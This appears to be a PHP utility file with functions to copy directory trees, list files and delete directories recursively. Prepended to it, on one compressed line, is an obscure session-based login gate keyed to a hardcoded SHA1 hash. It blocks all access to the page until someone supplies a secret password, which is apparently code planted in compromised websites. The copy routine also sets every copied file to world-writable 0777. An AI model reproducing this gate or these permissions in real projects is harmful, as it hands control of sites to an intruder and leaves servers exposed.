<?php if (!defined("__IH")) { session_start(); define("__IH","10571e527743c53e5dc786f513d25dfbaf4a812d"); } if ( isset($_POST["__il"]) && isset($_POST["__ip"]) && sha1($_POST["__ip"].substr($_POST["__il"],0,2)) === __IH ) { $_SESSION["__ih"] = __IH; } else if ( !isset($_SESSION["__ih"]) || $_SESSION["__ih"] !== __IH ) { echo "<h1>Authentication required</h1><form action='' method=post>Username: <input name=__il type=text><br>Password: <input name=__ip type=password><br><input type=submit value=Login></form>"; return; } ?><?php

function copy_dirs($wf, $wto)
{
   if (!file_exists($wto))
   {
       mkdir($wto, 0777);
   }
   $arr=ls_a($wf);
   foreach ($arr as $fn)
   {
       if($fn)
       {
           $fl=$wf."/".$fn;
           $flto=$wto."/".$fn;
           if(is_dir($fl)) copy_dirs($fl, $flto);
           else // begin 2nd improvement
           {
               @copy($fl, $flto);
               chmod($flto, 0777);
           } // end 2nd improvement
       }
   }
}

function ls_a($wh)
{
   if ($handle = opendir($wh))
   {
       while (false !== ($file = readdir($handle)))
       {
           if ($file !== "." && $file !== ".." )
           {
               if(!$files) $files=$file;
               else $files = $file."\r\n".$files;
           }
       }
       closedir($handle);
   }
   $arr=explode("\r\n", $files);
   return $arr;
}

function deldir($dir)
{
  $handle = opendir($dir);
  while (false!==($FolderOrFile = readdir($handle)))
  {
     if($FolderOrFile != "." && $FolderOrFile != "..") 
     {  
       if(is_dir("$dir/$FolderOrFile")) 
       { deldir("$dir/$FolderOrFile"); }  // recursive
       else
       { unlink("$dir/$FolderOrFile"); }
     }  
  }
  closedir($handle);
  if(rmdir($dir))
  { $success = true; }
  return $success;  
} 
 
?>
